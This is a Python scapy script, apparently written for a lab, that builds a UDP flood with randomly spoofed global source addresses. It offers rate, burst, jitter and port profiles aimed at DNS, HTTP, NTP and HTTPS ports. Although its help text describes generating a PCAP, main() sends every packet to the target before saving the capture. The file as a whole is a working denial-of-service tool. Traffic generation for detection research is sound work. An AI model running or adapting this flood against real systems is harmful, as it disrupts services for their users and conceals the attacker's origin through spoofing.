import argparse
import ipaddress
import math
import random
import time

from scapy.all import IP, UDP, Raw, send, wrpcap


SUPPORTED_PORTS = (53, 80, 123, 443)
PROFILES = {
    "low_steady": {"pps": 50, "duration": 20.0, "payload_size": 256, "payload_variation": 64, "spoof_pool_size": 1000, "target_ports": (53,)},
    "medium_steady": {"pps": 150, "duration": 10.0, "payload_size": 900, "payload_variation": 150, "spoof_pool_size": 1500, "target_ports": (53,)},
    "high_steady": {"pps": 400, "duration": 5.0, "payload_size": 1400, "payload_variation": 40, "spoof_pool_size": 2000, "target_ports": (80,)},
    "bursty": {"pps": 200, "duration": 10.0, "payload_size": 1024, "payload_variation": 256, "spoof_pool_size": 1600, "target_ports": (443,), "burst_size": 30, "burst_gap": 0.2},
    "jittered": {"pps": 90, "duration": 18.0, "payload_size": 512, "payload_variation": 128, "spoof_pool_size": 1400, "target_ports": (123,), "jitter": 0.005},
    "multi_port": {"pps": 160, "duration": 10.0, "payload_size": 768, "payload_variation": 256, "spoof_pool_size": 1600, "target_ports": SUPPORTED_PORTS},
}
DEFAULTS = {
    "target": "10.10.0.3",
    "port": 53,
    "target_ports": None,
    "pps": 150,
    "duration": 10,
    "payload_size": 1200,
    "payload_variation": 0,
    "spoof_pool_size": 1500,
    "jitter": 0.0,
    "burst_size": 0,
    "burst_gap": 0.0,
    "seed": None,
    "profile": None,
    "output": "/pcaps/udp_flood_candidate.pcap",
}


def parse_ports(value):
    try:
        ports = tuple(int(port) for port in value.split(",") if port)
    except ValueError as error:
        raise argparse.ArgumentTypeError("--target-ports must be comma-separated integers") from error
    if not ports or any(port not in SUPPORTED_PORTS for port in ports):
        raise argparse.ArgumentTypeError("--target-ports must use supported UDP flood ports")
    return ports


def random_source_ip(victim_ip, rng=None):
    randomizer = rng or random
    while True:
        source_ip = ipaddress.IPv4Address(randomizer.getrandbits(32))
        if source_ip.is_global and source_ip != victim_ip:
            return str(source_ip)


def build_spoof_pool(victim_ip, pool_size, rng=None):
    randomizer = rng or random
    pool = []
    identities = set()
    while len(pool) < pool_size:
        source_ip = random_source_ip(victim_ip, randomizer) if rng else random_source_ip(victim_ip)
        source_port = randomizer.randint(1024, 65535)
        identity = (source_ip, source_port)
        if identity not in identities:
            identities.add(identity)
            pool.append(identity)
    return pool


def apply_profile(args):
    profile = getattr(args, "profile", None)
    values = DEFAULTS | (PROFILES[profile] if profile else {}) | vars(args)
    for name, value in values.items():
        setattr(args, name, value)


def parse_args(argv=None):
    parser = argparse.ArgumentParser(
        description="Generate a UDP flood PCAP with spoofed source addresses.",
        argument_default=argparse.SUPPRESS,
    )
    parser.add_argument("--target", help="Target IPv4 address")
    parser.add_argument("--port", type=int, help="Target UDP port")
    parser.add_argument("--target-ports", type=parse_ports, help="Comma-separated target UDP ports")
    parser.add_argument("--pps", type=int, help="Packets per second")
    parser.add_argument("--duration", type=float, help="Flood duration in seconds")
    parser.add_argument("--payload-size", type=int, help="Baseline UDP payload size in bytes")
    parser.add_argument("--payload-variation", type=int, help="Bounded payload-size variation in bytes")
    parser.add_argument("--spoof-pool-size", type=int, help="Number of spoofed source identities")
    parser.add_argument("--jitter", type=float, help="Maximum timing jitter in seconds")
    parser.add_argument("--burst-size", type=int, help="Packets per burst, or zero for steady traffic")
    parser.add_argument("--burst-gap", type=float, help="Pause after each burst in seconds")
    parser.add_argument("--seed", type=int, help="Seed for reproducible packet structure")
    parser.add_argument("--profile", choices=tuple(PROFILES), help="Bounded UDP-flood traffic profile")
    parser.add_argument("--output", help="Output PCAP file")
    args = parser.parse_args(argv)
    apply_profile(args)

    try:
        ipaddress.IPv4Address(args.target)
    except ipaddress.AddressValueError:
        parser.error("--target must be a valid IPv4 address")

    if args.port not in SUPPORTED_PORTS:
        parser.error("--port must use a supported UDP flood port")
    if args.pps <= 0:
        parser.error("--pps must be greater than zero")
    if args.duration <= 0:
        parser.error("--duration must be greater than zero")
    if not 1 <= args.payload_size <= 65507:
        parser.error("--payload-size must be between 1 and 65507 bytes")
    if args.payload_variation < 0 or args.payload_variation >= args.payload_size:
        parser.error("--payload-variation must be non-negative and smaller than --payload-size")
    if args.payload_size + args.payload_variation > 65507:
        parser.error("--payload-size plus --payload-variation must not exceed 65507")
    if args.spoof_pool_size <= 0:
        parser.error("--spoof-pool-size must be greater than zero")
    if args.jitter < 0:
        parser.error("--jitter must be zero or greater")
    if args.burst_size < 0:
        parser.error("--burst-size must be zero or greater")
    if args.burst_gap < 0:
        parser.error("--burst-gap must be zero or greater")
    args.target_ports = tuple(args.target_ports or (args.port,))
    return args


def build_packets(target, port, pps, duration, payload, spoof_pool, target_ports=None, payload_variation=0, jitter=0.0, burst_size=0, burst_gap=0.0, rng=None):
    randomizer = rng or random
    ports = tuple(target_ports or (port,))
    packet_count = math.ceil(pps * duration)
    interval = 1 / pps
    timestamp = 0.0
    packets = []
    for sent in range(packet_count):
        source_ip, source_port = spoof_pool[sent % len(spoof_pool)]
        size = len(payload) if not payload_variation else randomizer.randint(len(payload) - payload_variation, len(payload) + payload_variation)
        packet = IP(src=source_ip, dst=target) / UDP(
            sport=source_port, dport=ports[sent % len(ports)]
        ) / Raw(load=b"A" * size)
        packet.time = timestamp
        packets.append(packet)
        timestamp += max(0.000001, interval + randomizer.uniform(-jitter, jitter)) if jitter else interval
        if burst_size and (sent + 1) % burst_size == 0:
            timestamp += burst_gap
    return packets


def main():
    args = parse_args()
    victim_ip = ipaddress.IPv4Address(args.target)
    rng = random.Random(args.seed) if args.seed is not None else None
    spoof_pool = build_spoof_pool(victim_ip, args.spoof_pool_size, rng)
    packets = build_packets(
        args.target,
        args.port,
        args.pps,
        args.duration,
        b"A" * args.payload_size,
        spoof_pool,
        target_ports=args.target_ports,
        payload_variation=args.payload_variation,
        jitter=args.jitter,
        burst_size=args.burst_size,
        burst_gap=args.burst_gap,
        rng=rng,
    )
    print(f"Sending UDP flood to {args.target}:{','.join(map(str, args.target_ports))} at {args.pps} PPS for {args.duration:g} seconds.")
    for index, packet in enumerate(packets):
        send(packet, verbose=False)
        if index + 1 < len(packets):
            pause = max(0.0, float(packets[index + 1].time) - float(packet.time))
            if pause:
                time.sleep(pause)
    wrpcap(args.output, packets)
    print(f"Completed UDP flood. Sent {len(packets)} packets across {len(spoof_pool)} spoofed identities; wrote pcap to {args.output}.")


if __name__ == "__main__":
    main()
